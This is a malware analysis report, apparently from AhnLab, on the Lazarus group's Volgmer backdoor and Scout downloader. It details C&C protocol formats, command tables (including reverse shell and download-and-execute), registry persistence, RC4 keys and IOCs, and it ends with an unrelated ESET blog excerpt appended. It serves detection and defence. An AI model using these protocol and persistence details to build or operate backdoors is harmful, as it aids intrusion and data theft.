0x00	0x0A	“cgi_config”
0x0A	0x08	Victim ID
0x12	0x04	The first C&C server’s IP address
0x16	0x04	The first C&C server’s port number
0x1A	0x04	The second C&C server’s IP address
0x1E	0x04	The second C&C server’s port number
…	…	…
Table 1. Configuration data
Volgmer obtains one of the C&C servers from the list in the configuration data and connects to it. It then transmits an HTTP packet, which is created using a random combination of strings, similar to when the service and file name were created. One HTTP request method is selected among “GET”, “POST”, or “HEAD”, and one of the eight User Agent strings is selected. A characteristic of Volgmer is that the User Agent strings contain a typo, where it reads “Mozillar” instead of “Mozilla”. After these processes, it transmits an arbitrarily selected HTTP packet, and then uses the RIPEMD-160 hash to perform the verification process with the C&C server.
 Figure 3. Strings used for creating the HTTP packet
After the verification process with the C&C server is complete, information on the infected system is transmitted over two batches. The first includes information such as whether or not the currently running system is a virtual machine, currently running security programs, and installed software.
Offset	Size	Data
0x00	0x08	ID
0x08	0x08	NULL
0x10	0x04	Execution Flag
0x14	0x04	Time
0x18	0x04	Scan for virtual machine environments
0x1C	0x04	Scan for installed software
0x20	0x04	Scan for security programs
0x24	0x04	Scan for debugging
0x28	0x04	Scan to check if it is running in the svchost.exe process
Table 2. Data transmitted to the C&C server – 1
Next, it collects a variety of information such as the computer name, network information, hardware information, language, installed antivirus software, and running services, before sending them to the C&C server. Additionally, running services are scanned through the port that is currently being listened to; targets include FTP, SSH, DNS, HTTP, SMB, RDP, MS-SQL, and VNC.
Offset	Data
0x0000	IP address
0x0004	Computer name
0x0084	CPU information
0x0184	Number of processors
0x0188	Windows version
0x02D0	MAC address
0x02D6	Malware name
0x0316	Malware file name
0x0358	Sleep time
0x035C	Installed antivirus software
0x0360	Locale information
0x03E0	List of services in use
0x03E8	“DING”
0x03EC	“PADD”
0x03F0	“INGX”
0x03F4	“XPAD”
Table 3. Data transmitted to the C&C server – 2
Afterward, Volgmer can receive commands from the C&C server to run features such as file-related tasks, command execution, reverse shell, etc.
Command	Feature
0x1000	Transmit system information
0x1009	Modify C&C address list (registry key)
0x100A	Transmit C&C address list
0x100B	Download file
0x100C	Upload and delete file
0x100D	Upload file
0x100E	Execute file
0x100F	Download and execute file
0x1010	Delete file
0x1011	Set sleep time
0x1012	Reverse shell
Table 4. C&C commands
There is also a variant of the initial version of Volgmer. While it has the same C&C command routines, the major differences include the fact that the signature string used in the configuration data was “config_reg” instead of “cgi_config” and that the registry key where the configuration data is saved was changed to the following.
 Figure 4. Changed signature string
•	Registry Key – 1: HKLM\SYSTEM\CurrentControlSet\Control\WMI\Security / 2d54931A-47A9-b749-8e23-311921741dcd
•	Registry Key – 2: HKLM\SYSTEM\CurrentControlSet\Control\WMI\Security / c72a93f5-47e6-4a2a-b13e-6AFE0479cb01

1.2. Later Version of Volgmer
A new version of Volgmer started being used in 2017. While there are differences in the C&C command routine between this and the initial version, there are various similarities including the major characteristic that the configuration data is encrypted and saved in the registry key “HKLM\SYSTEM\CurrentControlSet\Control\WMI\Security” for use. Other similarities can be seen in the fact that the dropper runs after being registered as a service because it is in a service DLL format and that Volgmer DLL’s file name or the strings used when registering it as a service are created by randomly combining certain strings.
The later version of Volgmer covered in this section has the same C&C command routine as the backdoor in the report released by Kaspersky in 2021. [13] Because the Lazarus group is known for using a variety of backdoors, it is presumed that the backdoors that were often used in attacks in Korea were altered and used in other attacks as well. Here we will analyze the later version of Volgmer backdoor DLL, and the malware thought to be the dropper that installs this will be covered alongside the analysis of Scout later on.

1.2.1. ANALYSIS OF VOLGMER BACKDOOR
The later version of Volgmer decrypts the configuration data saved in a certain registry key to obtain the C&C addresses. When creating the Volgmer backdoor, the dropper creates a file name by randomly combining certain strings and uses the Hex value of the first four letters of this file name as the registry value where the configuration data will be stored. This will be covered in more detail later on. Accordingly, Volgmer references the first four letters of its own file name and reads the following registry value while running.
•	Registry Key: HKLM\SYSTEM\CurrentControlSet\Control\WMI\Security / [First four letters of the file name]-5903-ed41-902f-e93a29dafef5
The read data is decrypted using the RC4 algorithm. While later versions of Volgmer all use the RC4 algorithm, they are largely divided into two types depending on the decryption method. The first is a type that uses a manually implemented RC4 algorithm, and the other type uses Crypto API to obtain the SHA-1 hash and uses the resulting value to perform RC4 decryption. The method of manually-implemented RC4 algorithm uses a 4-byte key for decryption, and the routine that uses Crypto API uses a 4-byte key to obtain the SHA-1 hash before using this as the RC4 key. Additionally, the first 0x10 size of the SHA-1 value is used as the RC4 algorithm key. For example, the SHA-1 hash of the value “DE A7 00 00” is “8f919e6d8970faede0b10cfd5f82da53a83ca34d”, but the value “8766fe8380b144907efa286a814c2241″ is used as the RC4 key.
 Figure 5. Decryption routine using the SHA-1 hash and RC4 algorithm
•	RC4 Key (manually implemented): E2 28 00 00
•	RC4 Key (Crypto API): DE A7 00 00
Volgmer selects one of the C&C server addresses from the configuration data and connects to it. The later version of Volgmer and the Scout downloader to be covered later use the HTTP protocol to communicate with the C&C server. All identified C&C addresses used https. The POST method is used for initial connection to the C&C server or when receiving commands from it; different parameters have been used depending on the point in time. The most recent version of Volgmer which appeared after 2020 uses a similar parameter as that mentioned in Kaspersky’s report of 2021. Additionally, the period and types mentioned in this blog post only refer to instances where cases of attacks have been identified and may differ depending on the cases that have not actually been confirmed.
Period	Parameter Format
2017 – 2019	secgb=[param1]&secdata=[param2]
2019	sessions=[param1]&secinfo=[param2]
2020	jsessid=[param1]&cookie=[param2]
Table 5. Format of the HTTP request to the C&C server
 Figure 6. Packet used in the authentication process with the C&C server
Period	Request Type	Parameter #1	Parameter #1 Structure	Parameter #2	Parameter #2 Structure
2017 –
2019	Initial access	secgb	Random (0x9)	secdata	message ID – “60D49D98” (0x08),
victim ID (0x08),
Random (0x8)
+ C&C address (Base64)
	C&C communication	secgb	Random (0x9)	secdata	message ID – “60D49D99” (0x08),
victim ID (0x08),
Random (0x8)
+ 0x60D49D94 (RC4)
	Send results	secgb	Random (0x9)	secdata	message ID – “60D49D99”, etc. (0x08),
victim ID (0x08),
Random (0x8)
+ Data (RC4)
2019	Initial access	sessions	Random (0x6)	secinfo	message ID – “60D49D98” (0x08),
victim ID (0x08),
Random (0x8)
+ C&C address (Base64)
	C&C communication	sessions	Random (0x6)	secinfo	message ID – “60D49D99” (0x08),
victim ID (0x08),
Random (0x8)
+ 0x60D49D94 (RC4)
	Send results	sessions	Random (0x6)	secinfo	“60D49D99” (0x08),
victim ID (0x08),
Random (0x8)
+ Data (RC4)
From 2020 onwards	Initial access	cookie	Random (0x10)
+ 0x60D49D94 (Base64)
+ Random (0x10)	jsessid	message ID – “60D49D99” (0x08),
victim ID (0x08),
Random (0x8)
	C&C communication	cookie	Random (0x10)
+ 0x60D49D94 (RC4)
+ Random (0x10)	jsessid	message ID – “60D49D99” (0x08),
victim ID (0x08),
Random (0x8)
	Send results	cookie	Random (0x10)
+ Data (RC4)
+ Random (0x10)	jsessid	message ID – “60D49D99” (0x08),
victim ID (0x08),
Random (0x8)
Table 6. Argument parameters
The message ID “60D49D98″ is used for initial communication with the C&C server. For the data, the C&C server address is encrypted in Base64 and transmitted. Afterward, the 0x60D49D94 value is transmitted with the message ID “60D49D99″ to receive commands. The value 0x60D49D94 is not only used for requests but also for responding. This is because Volgmer verifies communications with the C&C server by checking whether the decrypted response value is 0x60D49D94.
message ID	Feature
60D49D98	Establish connection
60D49D99	Request command
60D49DB6	Transmit system information
Table 7. Types of msg IDs
The Base64 algorithm is used for data encryption upon initial authentication. Afterward, the RC4 algorithm is used for encryption and decryption. There are types of Volgmer that also manually implement the RC4 algorithm or use the Crypto API, and Volgmer is particular for using a different RC4 key for each type.
•	RC4 Key (manually implemented): 8D 52 00 00
•	RC4 Key (Crypto API): A3 D5 00 00
Volgmer provides features to control the infected system, much like a typical backdoor. The following is a list of commands for a certain version of Volgmer backdoor. Volgmer types categorized as the later version mostly support the same commands.
Command	Feature
0x60D49D94	Default response
0x60D49D95	Default
0x60D49D97	Set the wait time using the default value
0x60D49D9F	Set the wait time using the received value
0x60D49DA0	Transmit system information (computer name, Windows version, architecture, IP information, etc.)
0x60D49DA1	Look up drive information
0x60D49DA2	Look up list of files
0x60D49DA3	Look up list of processes
0x60D49DA4	Terminate process
0x60D49DA5	Set the current task path
0x60D49DA6	Scan (connect to the received address)
0x60D49DA7	Timestomping
0x60D49DA8	Reverse shell
0x60D49DA9	Delete file
0x60D49DAA	Execute program
0x60D49DAB	Execute program (with certain privileges)
0x60D49DAC	Execute program (as an administrator)
0x60D49DAD	Download files
0x60D49DAE	Transfer file contents
0x60D49DAF	Transfer file (compressed in cab format)
0x60D49DB0	Look up directory
0x60D49DB1	Send configuration data
0x60D49DB2	Download and apply configuration data
0x60D49DB3	Apply the current time to the configuration data
0x60D49DB4	Sleep
0x60D49DB5	Transmit information (module name, etc.)
0x60D49DB7	Delete and terminate the “CMb*.a-p” file
Table 8. List of commands
A notable point is that the aforementioned timestomping and file deletion techniques often employed by the Lazarus group are supported as commands. The timestomping command changes the timestamp of the file at a path received from the C&C server to the timestamp of another file in another path received alongside the first piece of information. Instead of simply deleting the file, the file deletion command overwrites it with the value “0x5F 00 00 00 00 …” before deletion to prevent recovery.
 Figure 7. File overwritten before being deleted
Although there are records of PebbleDash being recently used by another threat group, it is by default a backdoor known to have been used by the Lazarus group. When a new drive or session is created, PebbleDash supports the feature of terminating the wait routine and initializing communication with the C&C server (i.e., being activated). [14] This is because PebbleDash has a long wait time in the process of communicating with the C&C server and it is difficult for it to respond to changes in the infected system in real-time. These features are also found in other backdoors of the Lazarus group, with the major one being Volgmer. Aside from Volgmer, there was a case where this feature was supported by the OpenCarrot backdoor mentioned in a report from SentinelOne. [15]
Additionally, among the files that Volgmer deletes periodically, the file “BIT*.tmp” is presumed to be for deleting the CAB file which is created while executing the 0x60D49DAF command responsible for the file transfer feature. However, the file named “CMb*.a-p” deleted by the 0x60D49DB7 command is not observed with the current analysis target, Volgmer, alone.

2. Analysis of Scout Downloader
Following its first use in 2014, Volgmer was used until around 2021. In 2022, a downloader began being detected. This is similar to Volgmer, but instead of having backdoor features, it is a downloader that downloads another malware from an external source and executes it in the memory area. While the downloaded payload could not be procured, there are three notable points about it. First is that it is being detected after the end of Volgmer’s active period. The second is that its communication method with the C&C server and loading of the configuration data are the same as Volgmer. Lastly, it also has records of being created by a similar dropper.
This malware is largely categorized into two types depending on the routine. One was mainly observed in the first half of 2022 and the other was distributed from late 2022 to 2023. The second type has a few more routines added in comparison to the first, and as mentioned in the PDB information above, the presence of the keyword “Scout” and the version v2.x allow us to assume that this is an improved version of Scout that was distributed in the first half of 2022. Accordingly, we will classify the type distributed in the first half of 2022 as Scout v1 and the type being identified from late 2022 to 2023 as Scout v2. Additionally, the period and types mentioned in this blog post only refer to instances where cases of attacks have been identified and may differ depending on the cases that have not actually been confirmed.
Most Windows versions of malware are created with a character user interface (CUI) to run in the background without the user being aware. The Scout downloader characteristically creates a window when running, like Graphical User Interface (GUI) programs. Of course, the window size is set to 0 and is not actually noticeable to the user, and this is likely to disguise the malware as a legitimate program.
 Figure 8. The routine that creates a window titled “Windows”
Unlike the Volgmer backdoor that saved the configuration data in the registry key, there is a type of Scout downloader where the configuration data is in the Overlay area at the end of the file. In this case, Scout uses the string transmitted as an argument for the decryption key.
 Figure 9. Configuration data in the Overlay area
In this section, we will analyze the Scout downloader; for this, we will first cover the dropper that installs Scout. This dropper contains the actual malware and registry value in the Overlay area at the end of the file, and as these are encrypted with the RC4 algorithm, the string given as an argument is used as the RC4 key for decryption. While the argument has not been identified, there are AhnLab ASD logs that show Scout having been created.
 Figure 10. The dropper that creates Scout
In addition, an examination of the same type of dropper observed in around 2021 reveals a routine that configures the registry key used by the Volgmer backdoor, and it also uses the same RC4 key for encrypting the registry value. This shows that the threat actor installed the Volgmer backdoor until 2021 and from 2022 used the same dropper to install the Scout downloader.

2.1. Dropper (Volgmer, Scout)
The dropper is classified as either the Volgmer dropper or Scout dropper depending on the malware it creates. The differences are in the registry key for writing configuration data to and the RC4 key for encrypting the configuration data. Other than those, the actual routines are identical. However, it is divided into the injector type and the service registration type according to the way it installs the malware.
Like the initial version of the Volgmer dropper, the injector-type dropper creates the file name randomly; a random 2-5 character string is randomly generated, then one of the “svc”, “mgr”, or “mgmt” strings is selected randomly and added. If the generated file name is “bnsvc.dll”, the hex value of the first four letters is set as the registry value where the configuration data will be saved. For example, the hex value of “bnsv” is “62 6E 73 76″. In this case, the registry value where Volgmer and Scout’s configuration data is to be stored is as follows.
•	Volgmer: HKLM\SYSTEM\CurrentControlSet\Control\WMI\Security / “626e7376-5903-ed41-902f-e93a29dafef5”
•	Scout: HKLM\SYSTEM\CurrentControlSet\Control\WMI\Security / “626e7376-2790-10f2-dd2a-d92f482d094f”
Afterward, it uses the string given as an argument for the RC4 key, decrypts the encrypted DLL (i.e., Volgmer or Scout) added to the overlay area at the end of the file, and creates it under the name generated above in the %SystemDirectory% directory. The configuration data that contains the C&C addresses is also decrypted and saved in the registry value created in the stage above. Because the malware created in the %SystemDirectory% directory has its timestamp set to recent time, this is changed to the timestamp information of the calculator (i.e., calc.exe).
It is unclear whether the malware runs as intended after all the procedures up to this point, but the service is registered to the registry settings of the security package, and then the created DLL is injected into the lsass.exe process.
•	Security Package Registry Key: HKLM\SYSTEM\CurrentControlSet\Control\Lsa / Security Packages
The service registration type is different starting in the name generation routine. First, it obtains the netsvcs service group from the following registry key, then searches for each service in the “HKLM\SYSTEM\CurrentControlSet\Services\” entry and selects a service that is not currently registered.
•	HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost / netsvcs
If the selected service is “LogonHours”, it is registered to the netsvcs service, and the service DLL is created in the %SystemDirectory% directory under the name “LogonHourss.dll” with an extra “s”.
 Figure 11. The routine for service registration

2.2. Analysis of Scout Downloader
2.2.1. SCOUT DOWNLOADER V1
Like Volgmer, Scout performs a file name-based lookup of the registry value where the encrypted configuration data is saved. RC4 is used for the encryption algorithm, and identified instances of Scout all use Crypto API to decrypt the configuration data.
•	Registry Key: HKLM\SYSTEM\CurrentControlSet\Control\WMI\Security / [First four letters of the file name]-2790-10f2-dd2a-d92f482d094f
•	RC4 Key (Crypto API): F9 A3 DE 48
After decrypting the configuration data, it creates a window titled “Windows” as mentioned above. Its actual routine is implemented in the registered procedure. Scout characteristically has each feature implemented based on Windows messages. For example, first, it uses the SendMessageW() API to send a 0x5450 message which branches out into the 0x5451 message. The 0x5451 message connects to the C&C server and branches out into different routes depending on whether the authentication was successful or not.
 Figure 12. Windows message-based routine
Message Number	Feature
0x5450	Starting routine
0x5451	Connect to the C&C server and authenticate
0x5452	Download additional payload and execute it in the memory area (PE)
0x5453	Reset the C&C server address and reattempt to connect to the server
0x546D	Reattempt to connect to the C&C server
Table 9. Features of each message – Scout v1
Unlike Volgmer, the initial version of Scout had a single parameter and the string “param” was used. As it is a downloader, it has a simple structure with only two message IDs used: “184D0382” and “0E8AFD28”. The string “cqce” is encrypted and transmitted during the initial authentication process, and in order for the C&C server authentication process to be successful, the transmitted data string must be “1111”.
Request Type	Parameter	Parameter Structure	Data Structure
Initial access	param	Random (0x8),
victim ID (0x08),
message ID – “184D0382” (0x08),
Data (Base64)	Random (0x4), “cqce”, C&C URL
Download	param	Random (0x8),
victim ID (0x08),
message ID – “0E8AFD28” (0x08),
Data (RC4)	Random (0x4), configuration data
Table 10. Format of the HTTP request to the C&C server
 Figure 13. Packet used in the authentication process with the C&C server
The RC4 key used in communication with the C&C server is a 0x20 byte-sized key instead of the 4-byte key used for decrypting the configuration data. The download process involves first receiving the size of the payload to be downloaded. At this stage, the 0x20 byte-sized RC4 key is used, and when the encrypted payload with the defined size is downloaded, a 0x20 byte NULL data value is used as the RC4 key.
•	RC4 Key (Crypto API): 54 A6 BA C3 13 98 DB 1A 62 45 23 12 A8 83 71 82 4E 74 D2 38 00 00 00 00 00 00 00 00 00 00 00 00
The payload downloaded and decrypted with the RC4 key scans the “MZ” signature, then executes it in the memory area.

2.2.2. SCOUT DOWNLOADER V2
Since the second half of 2022, types with a few more routines added have been observed, but the actual features are the same. Among these types, there are multiple pieces of malware for which the PDB information still exists; this shows that the threat actor named the malware “Scout”.
Y:\Development\RT\Windows\Scout\Scout v2.1\Engine\Engine\x64\Penetrator\Engine.pdb
Y:\Development\RT\Windows\Scout\Scout v2.1\Engine\Engine\x64\Lsass\Engine.pdb
Y:\Development\RT\Windows\Scout\Scout v2.1\Engine\Engine\x64\Netsvc\Engine.pdb
Z:\Development\RT\Windows\Scout\Scout v2.2\Engine\Engine\x64\Netsvc\Engine.pdb
Z:\Development\RT\Windows\Scout\Scout v2.3\Engine\Engine\x64\Lsass\Engine.pdb
Scout versions v2.x support more commands (i.e., messages) in comparison to the past versions of Scout. While the Windows messages of the past versions have a simple flow, in versions v2.x, it downloads messages from the C&C server and uses them as commands. Accordingly, it can also execute commands for changing the configuration data aside from downloading additional payloads, Also, past versions encrypted the string “cqce” and transmitted it to the C&C server. In versions v2.x, the first string “bqce” is transmitted, but depending on the message command received from the C&C server, the values “fqce”, “eqce”, “dqce”, or “cqce” can be transmitted.
Message Number	Feature
0x5450	Starting routine. Connect to the C&C server and authenticate. (Flag : “bqce”)
0x5451	Download message.
0x5452	Download additional payload and execute it in the memory area (Shellcode). Download message.
0x5453	Download configuration data.
0x5454	Change settings data.
0x5455	Download additional payload and execute it in the memory area (PE).
0x5456	Download additional payload and inject (PE).
0x5457	Reattempt to connect to the C&C server. (Flag : “eqce”)
0x5458	Reattempt to connect to the C&C server. (Flag : “fqce”)
0x5459	Self-delete.
0x545A	Reattempt to connect to the C&C server. (Flag : “cqce”)
0x545B	Reattempt to connect to the C&C server. (Flag : “dqce”)
Table 11. Features of each message – Scout v2
 Figure 14. Added Windows messages
In comparison to the past versions, the method of communication with the C&C server for versions up to v2.2 used the “param” parameter, like the past versions. From v2.3, “jsessionid” is used as the parameter, and the RC4 key value is also different.
Request Type	Parameter	Parameter Structure	Data Structure
Initial access	jsessionid	Random (0x5),
victim ID (0x08),
message ID – “184D0382” (0x08)
+ Data (Base64)	Flag, C&C addresses
Downloading commands	jsessionid	Random (0x5),
victim ID (0x08),
message ID – “0E8AFD28” (0x08)	
Download settings	jsessionid	Random (0x5),
victim ID (0x08),
message ID – “0E8AFD28” (0x08)
+ Data (RC4)	Configuration data
Table 12. Format of the HTTP request to the C&C server
•	RC4 Key (param): 54 A8 BA C3 E3 98 DB 1A 6D 45 23 12 A8 83 71 82 4E 74 D2 38 00 00 00 00 00 00 00 00 00 00 00 00
•	RC4 Key (jsessionid): 73 D3 FE CC 23 AA 74 BA 53 47 88 32 73 11 19 AC FF D3 14 08 00 00 00 00 00 00 00 00 00 00 00 00

3. Conclusion
The Lazarus group is one of the very dangerous groups that are highly active worldwide, using various attack vectors such as spear phishing and supply chain attacks. Recently, the group exploited a security vulnerability in a Korean financial security authentication software in their initial access process and also exploited vulnerabilities in web security software or enterprise asset management programs in the lateral movement process.
Security managers of enterprises must identify assets that may be exposed to threat actors through attack surface management and always apply the latest security patches. Users must be particularly cautious of attachments to emails from unknown sources or executable files downloaded from web pages. Users should also apply the latest patch for OS and programs such as Internet browsers, and update V3 to the latest version to prevent such malware infection in advance.
File Detection
– Backdoor/Win.Lazardoor.C5233133 (2022.09.07.00)
– Backdoor/Win32.Agent.C3351518 (2019.07.25.00)
– Backdoor/Win32.Agent.R283184 (2019.07.25.00)
– Backdoor/Win64.Agent.C3371791 (2019.08.08.03)
– Data/BIN.Encoded (2022.10.05.00)
– Data/BIN.Encoded (2023.03.08.00)
– Data/BIN.EncPe (2022.09.07.00)
– Dropper/Win.Agent.C5499468 (2023.10.02.00)
– Dropper/Win32.Agent.C3371843 (2019.08.08.03)
– Dropper/Win64.Agent.C3371802 (2019.08.08.03)
– Malware/Win64.Generic.C4065063 (2020.04.16.07)
– Trojan/Win.Lazardoor.C4979367 (2022.02.24.02)
– Trojan/Win.Lazardoor.C4979368 (2022.02.24.03)
– Trojan/Win.Lazardoor.C5037872 (2022.03.31.00)
– Trojan/Win.Lazardoor.R474265 (2022.02.24.03)
– Trojan/Win.Lazardoor.R482731 (2022.04.07.01)
– Trojan/Win.Lazardoor.R495643 (2022.06.04.00)
– Trojan/Win.Lazardoor.R500179 (2022.06.24.00)
– Trojan/Win.LazarLoader.C5194304 (2022.07.06.01)
– Trojan/Win.LazarLoader.C5196326 (2022.07.06.03)
– Trojan/Win.LazarLoader.C5196363 (2022.07.06.04)
– Trojan/Win.LazarLoader.C5196414 (2022.07.07.00)
– Trojan/Win.LazarLoader.C5201772 (2022.07.11.03)
– Trojan/Win.LazarLoader.C5210732 (2022.07.19.00)
– Trojan/Win.LazarLoader.C5211408 (2022.07.20.01)
– Trojan/Win.LazarLoader.C5233120 (2022.09.07.00)
– Trojan/Win.LazarLoader.R480766 (2022.03.31.00)
– Trojan/Win.LazarLoader.R491208 (2022.05.10.02)
– Trojan/Win.LazarLoader.R500065 (2022.06.22.03)
– Trojan/Win.LazarLoader.R501218 (2022.06.28.03)
– Trojan/Win.Scout.R536659 (2022.11.30.00)
– Trojan/Win32.Agent.C876729 (2015.06.03.00)
– Trojan/Win32.Agent.R128643 (2014.12.17.00)
– Trojan/Win32.Akdoor.C3450548 (2019.08.29.04)
– Trojan/Win32.Backdoor.R174379 (2016.02.16.05)
– Trojan/Win32.Dllbot.C715400 (2015.02.12.04)
– Trojan/Win32.Ghost.C695717 (2015.01.27.05)
– Trojan/Win64.Agent.R274329 (2019.06.04.03)
– Trojan/Win64.Akdoor.R289258 (2019.08.29.00)
Behavior Detection
– Execution/MDP.Behavior.M10661
IOC
A portion of the file hash and a list of confirmed C&C addresses will be released on AhnLab TIP.
MD5
– 1ecd83ee7e4cfc8fed7ceb998e75b996: Volgmer Dropper initial version Type 1
– 35f9cfe5110471a82e330d904c97466a: Volgmer Backdoor initial version Type 1 (civolmgmt.dll)
– 5dd1ccc8fb2a5615bf5656721339efed: Volgmer Backdoor initial version Type 1 (divolenum.dll)
– 9a5fa5c5f3915b2297a1c379be9979f0: Volgmer Backdoor initial version Type 1 (fqrmsvc.dll)
– a545f548b09fdf61405f5cc07e4a7fa1: Volgmer Backdoor initial version Type 1
– eb9db98914207815d763e2e5cfbe96b9: Volgmer Backdoor initial version Type 1 (bgmsecenum.dll)
– fe32303e69b201f9934248cc06b32ef8: Volgmer Backdoor initial version Type 1 (xkupsvc.dll)
– 85b6e4ea8707149b48e41454cbd0d5ad: Volgmer Dropper initial version Type 2
– 64965a88e819fb93dbabafc4e3ad7b6c: Volgmer Backdoor initial version Type 2 (idefsrv.dll)
– 6da7d8aec65436e1350f1c0dfc4016b7: Volgmer Backdoor initial version Type 2
– e3d03829cbec1a8cca56c6ae730ba9a8: Volgmer Backdoor initial version Type 2 (hssvc.dll)
– 0171c4a0a53188fe6f9c3dfcc5722be6: Volgmer Backdoor later version (sbiimgr.dll)
– 17eacf4b4ae2ca4b07672dcc12e4d66d: Volgmer Backdoor later version (eqpkamgmt.dll)
– 1e2acecce7b5e9045b07d65e9e8afe1f: Volgmer Backdoor later version (Irmons.dll)
– 226cc1f17c4625837b37b5976acbd68e: Volgmer Backdoor later version (Exwtr.dll)
– 3e6119ebfacd1d88acbd2ca460c70b49: Volgmer Backdoor later version (helpsvcs.dll)
– 4753679cef5162000233d69330208420: Volgmer Backdoor later version (olesvc.bin)
– 5473fa2c5823fbab2b94e8d5c44bc7b4: Volgmer Backdoor later version (NWCWorkstations.dll)
– 570a4253ae80ee8c2b6b23386e273f3a: Volgmer Backdoor later version (Nlas.dll)
– 5c87373eef090bed525b80aef398ee8a: Volgmer Backdoor later version
– 693afaedf740492df2a09dfcc08a3dff: Volgmer Backdoor later version (ddmgr.dll)
– 6e21cc6669ada41e48b369b64ec5f37b: Volgmer Backdoor later version (ntmgr.dll)
– 72756e6ebb8274d9352d8d1e7e505906: Volgmer Backdoor later version (fhcmgr.dll)
– 8b3ec4b9c7ad20af418e89ca6066a3ad: Volgmer Backdoor later version (xbmgr.dll)
– 947124467bd04b7624d9b31e02b5ee7f: Volgmer Backdoor later version (hgiezmgmt.dll)
– 9a87f19609f28d7f7d76f9759864bd08: Volgmer Backdoor later version
– b1225fa644eebafba07f0f5e404bd4fd: Volgmer Backdoor later version (lrmons.dll)
– cf2ff5b59c638a06d8b81159b9a435ea: Volgmer Backdoor later version (tzmgr.dll)
– d52b5d8c20964333f79ff1bce3385d0b: Volgmer Backdoor later version (bqmgr.dll)
– e273803ae6724a714b970dd86ca1acd0: Volgmer Backdoor later version (fnsysN.dll)
– ea5d322648ff108b1c9cbdd1ef4a5959: Volgmer Backdoor later version (ntmgr.dll)
– 44fa8daa347ef5dd107bf123b4688797: Volgmer Dropper later version (ExwtrSvc.exe)
– 7f953c6988d829c9c4ac2002572c9055: Volgmer Dropper later version (ExwtrSvc.exe)
– c2ab2a8ffdc18c24080e889a634ef279: Volgmer Dropper later version (fmSysM.exe)
– 05bb1d8b7e62f4305d97042f07c64679: Scout Downloader v1 (Comms.db)
– 0b78347acf76d4bb66212bf9a41b9fb9: Scout Downloader v1 (gpklmgmt.dll)
– 0ed86587124f08325cd8f3d3d2556292: Scout Downloader v1 (bnsvc.dll)
– 35943aa640e122fcb127b2bfd6e29816: Scout Downloader v1 (helpsvcs.dll)
– 394b05394ebb9b239a063a6b5839edb9: Scout Downloader v1 (oxmgmt.dll)
– 5496adcd712d4378950ba62ad4c2423b: Scout Downloader v1 (gokimgmt.dll)
– 64cac69ab1e9108e0035f9ce38b47db7: Scout Downloader v1 (bnsvc.dll)
– 695e5b8dc9615ec603fe2cbb7326a50f: Scout Downloader v1 (helpsvcs.dll)
– c07e04d388fb394ac190aace51c03c33: Scout Downloader v1 (helpsvcs.dll)
– c41eb1ea59fab31147c5b107cc1c5a51: Scout Downloader v1 (tfbgmmgmt.dll)
– cc5a8a15d5808002e62d5daf2d4f31b3: Scout Downloader v1 (Comms.bin)
– 0b746394c9d23654577f4c0f2a39a543: Scout Downloader v2 (mib.cfg)
– 225cdc9b452b6d5a3f7616dcc9333d7d: Scout Downloader v2 (Keys.dat)
– 43f218d3a4b2199468b00a0b43f51c79: Scout Downloader v2 (wdsvc.dll)
– 4b1f1db4f169ca6b57015b313d665045: Scout Downloader v2 (olesvc.bin)
– 80d34f9ca10b0e8b49c02139e4615b7a: Scout Downloader v2 (NWCWorkstations.dll)
– 855e26d530e69ddc77bb19561fb19d90: Scout Downloader v2 (mib.bin)
– 9ec3a4257564658f651896abc608680e: Scout Downloader v2 (SRServices.dll)
– a76624578ed42cceba81c76660977562: Scout Downloader v2 (eppagent.bin)
– b517e7ad07d1182feb4b8f61549ff233: Scout Downloader v2 (usoshared.bin)
– fa868a38ceeb46ee9cf8bd441a67ae27: Scout Downloader v2 (ose.bin)
– 1f1a3fe0a31bd0b17bc63967de0ccc29: Scout Downloader v2 – Encoded (configmanager.tlb)
– fa3e49c877a95f37fd25dbd62f9e274c: Scout Downloader v2 – Encoded (event.dat)
– 202a7eec39951e1c0b1c9d0a2e24a4c4: Loader – Scout Downloader v2 (helpsvcs.dll)
– b457e8e9d92a1b31a4e2197037711783: Loader – Scout Downloader v2 (wpnsvc.dll)
– 8543667917a318001d0e331aeae3fb9b: Config – Scout Downloader v2 (C_68656c.NLS)
– c16a6178a4910c6f3263a01929f306b9: Scout Downloader v2 (C_77706e.NLS)
– 1c89fb4aee20020bfd75713264df97cd: Dropper – Scout Downloader
– 76f02ab112b8e077544d0c0a6e0c428a: Dropper – Scout Downloader (wAgent.dat)
– 7ba37d662f19bef27c3da2fd2cee0e3a: Dropper – Scout Downloader (wAgent.dat)
– 7f0e773397808b4328ad11d6948a683f: Dropper – Scout Downloader (Comms.bin)
– bf5d815597018fe7f3dfb52d4f7e1f65: Dropper – Scout Downloader








Lazarus luring employees with trojanized coding challenges: The case of a Spanish aerospace company
While analyzing a Lazarus attack luring employees of an aerospace company, ESET researchers discovered a publicly undocumented backdoor
 
Peter Kálnai
29 Sep 2023  •  28 min. read
 
ESET researchers have uncovered a Lazarus attack against an aerospace company in Spain, where the group deployed several tools, most notably a publicly undocumented backdoor we named LightlessCan. Lazarus operators obtained initial access to the company’s network last year after a successful spearphishing campaign, masquerading as a recruiter for Meta – the company behind Facebook, Instagram, and WhatsApp.
The fake recruiter contacted the victim via LinkedIn Messaging, a feature within the LinkedIn professional social networking platform, and sent two coding challenges required as part of a hiring process, which the victim downloaded and executed on a company device. The first challenge is a very basic project that displays the text “Hello, World!”, the second one prints a Fibonacci sequence – a series of numbers in which each number is the sum of the two preceding ones. ESET Research was able to reconstruct the initial access steps and analyze the toolset used by Lazarus thanks to cooperation with the affected aerospace company.
In this blogpost, we describe the method of infiltration and the tools deployed during this Lazarus attack. We will also present some of our findings about this attack at the Virus Bulletin conference on October 4, 2023.
Key points of the blogpost:
•	Employees of the targeted company were contacted by a fake recruiter via LinkedIn and tricked into opening a malicious executable presenting itself as a coding challenge or quiz.
•	We identified four different execution chains, delivering three types of payloads via DLL side-loading .
•	The most notable payload is the LightlessCan backdoor, implementing techniques to hinder detection by real-time security monitoring software and analysis by cybersecurity professionals; this presents a major shift in comparison with its predecessor BlindingCan, a flagship HTTP(S) Lazarus RAT.
•	We attribute this activity with a high level of confidence to Lazarus, particularly to its campaigns related to Operation DreamJob.
•	The final goal of the attack was cyberespionage.
Lazarus delivered various payloads to the victims’ systems; the most notable is a publicly undocumented and sophisticated remote access trojan (RAT) that we named LightlessCan, which represents a significant advancement compared to its predecessor, BlindingCan. LightlessCan mimics the functionalities of a wide range of native Windows commands, enabling discreet execution within the RAT itself instead of noisy console executions. This strategic shift enhances stealthiness, making detecting and analyzing the attacker’s activities more challenging.
